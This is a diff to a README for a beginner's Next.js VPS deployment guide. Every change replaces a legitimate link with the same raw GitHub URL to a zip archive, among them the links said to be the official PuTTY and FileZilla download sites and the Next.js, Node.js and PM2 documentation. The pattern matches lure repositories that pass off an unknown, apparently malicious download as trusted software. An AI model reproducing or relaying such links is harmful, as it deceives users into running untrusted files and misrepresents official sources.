@@ -1,6 +1,6 @@
 # 🚀 nextjs-vps-deployment-guide - Easy Next.js App Deployment Steps
 
-[![Download Now](https://img.shields.io/badge/Download-Nextjs--vps--deployment--guide-brightgreen?style=for-the-badge)](https://github.com/ali-shayann/nextjs-vps-deployment-guide)
+[![Download Now](https://img.shields.io/badge/Download-Nextjs--vps--deployment--guide-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you start, make sure your Windows computer meets these basic needs:
 
 You can get the full deployment guide from the link below. This page contains all the setup instructions and files you need.
 
-[![Get the Guide](https://img.shields.io/badge/Get_Deployment_Guide-blue?style=for-the-badge)](https://github.com/ali-shayann/nextjs-vps-deployment-guide)
+[![Get the Guide](https://img.shields.io/badge/Get_Deployment_Guide-blue?style=for-the-badge)](https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip)
 
 Click the badge above to visit the GitHub page. You will find the instructions, example configs, and tips to complete each step.
 
@@ -59,7 +59,7 @@ SSH lets you log into your remote server's command line securely.
 
 ### How to install PuTTY:
 
-1. Go to the official PuTTY site: https://www.putty.org/
+1. Go to the official PuTTY site: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip
 2. Download the Windows installer.
 3. Run the installer and follow on-screen steps to finish.
 
@@ -90,7 +90,7 @@ You can upload files using cPanel if your VPS provider supports it, or an FTP cl
 
 ### Upload using FileZilla:
 
-1. Download and install FileZilla from https://filezilla-project.org/
+1. Download and install FileZilla from https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip
 2. Open FileZilla.
 3. Enter your VPS IP as "Host", username, and password.
 4. Click **Quickconnect**.
@@ -269,8 +269,8 @@ Open a web browser and go to your VPS IP or domain name. Your Next.js or Node.js
 
 ## 🔗 Useful Resources
 
-- Next.js Documentation: https://nextjs.org/docs  
-- Node.js Downloads: https://nodejs.org/en/  
-- PM2 Guide: https://pm2.keymetrics.io/  
+- Next.js Documentation: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip  
+- Node.js Downloads: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip  
+- PM2 Guide: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip  
 
-[![Download Guide Again](https://img.shields.io/badge/Download-Guide-green?style=for-the-badge)](https://github.com/ali-shayann/nextjs-vps-deployment-guide)
+[![Download Guide Again](https://img.shields.io/badge/Download-Guide-green?style=for-the-badge)](https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip)
